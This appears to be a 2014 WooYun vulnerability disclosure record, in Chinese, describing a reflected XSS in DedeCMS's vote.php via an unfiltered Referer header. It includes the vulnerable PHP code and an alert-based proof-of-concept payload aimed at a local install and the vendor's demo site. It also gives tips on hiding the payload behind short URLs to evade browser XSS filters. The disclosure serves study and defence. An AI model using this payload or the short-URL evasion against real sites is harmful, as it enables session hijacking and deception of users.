{"id": 51147, "wybug_id": "wooyun-2014-075535", "wybug_title": "dedecms 全版本xss跨站一枚（ referer构造触发）", "wybug_corp": "Dedecms", "wybug_author": "风情万种", "wybug_date": "2014-09-10 16:24", "wybug_open_date": "2014-12-06 16:26", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-15：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向公众公开  简要描述： dedecms 全版本！xss跨站一枚! referer构造触发！ 详细说明：  文件：/plus/vote.php\n$ENV_GOBACK_URL = empty($_SERVER['HTTP_REFERER']) ? '':$_SERVER['HTTP_REFERER'];............................................//判断是否允许被查看$admin = new userLogin;if($dopost == 'view'){    if($row['view'] == 1 && empty($admin->userName))    {        ShowMsg('此投票项不允许查看结果',$ENV_GOBACK_URL);        exit();    }}.........................\nShowMsg 函数\nfunction ShowMsg($msg, $gourl, $onlymsg=0, $limittime=0){    if(empty($GLOBALS['cfg_plus_dir'])) $GLOBALS['cfg_plus_dir'] = '..';.....................................................                $func .= \"var pgo=0;        function JumpUrl(){if(pgo==0){ location='$gourl';        pgo=1; }}\\r\\n\";        $rmsg = $func;        $rmsg .= \"document.write(\\\"<br /><div style='width:450px;padding:0px;border:1px solid #DADADA;'>\";        $rmsg .= \"<div style='padding:6px;font-size:12px;border-bottom:1px solid #DADADA;background:#DBEEBD url({$GLOBALS['cfg_plus_dir']}/img/wbg.gif)';'><b>DedeCMS 提示信息！</b></div>\\\");\\r\\n\";        $rmsg .= \"document.write(\\\"<div style='height:130px;font-size:10pt;background:#ffffff'><br />\\\");\\r\\n\";        $rmsg .= \"document.write(\\\"\".str_replace(\"\\\"\",\"“\",$msg).\"\\\");\\r\\n\";        $rmsg .= \"document.write(\\\"\";.......................................................      echo $msg;}\n$_SERVER['HTTP_REFERER'] 未过滤直接输出到js中！由于官方默认数据库均有一个投票记录 所以基本上都可以触发此xss$_SERVER['HTTP_REFERER']明显是不安全的 比如我在本地写一个文件test.html\n<a href=\"/dedecms7/plus/vote.php?aid=1&dopost=view\">xss测试</a>\n打开此文件 url这样: http://192.168.1.89/test.html?a=';alert(/xss/);pgo=1}// 然后点击xss测试 就触发了xss\n\n同样织梦官方demo也不例外 只需把链接改成 <a href=\"http://v57.demo.dedecms.com/plus/vote.php?aid=1&dopost=view\">xss测试</a>\n\n那么咋利用呢？很简单！只需要把 http://192.168.1.89/test.html?a=';alert(/xss/);pgo=1}// 变成自动跳转就行！现在有短地址嘛！！！完全看不出xss痕迹！还可以逃避浏览器的xss过滤   漏洞证明：  \n\n\n\n   修复方案：  ....   版权声明：转载请注明来源 风情万种@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-06 16:26 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-10 16:40 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  前排瓜子    \n     2014-09-10 16:45 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  我mark了    \n     2014-09-13 15:51 |    \t\tMuZhU0 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        )\t\t \n  前排坐等    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}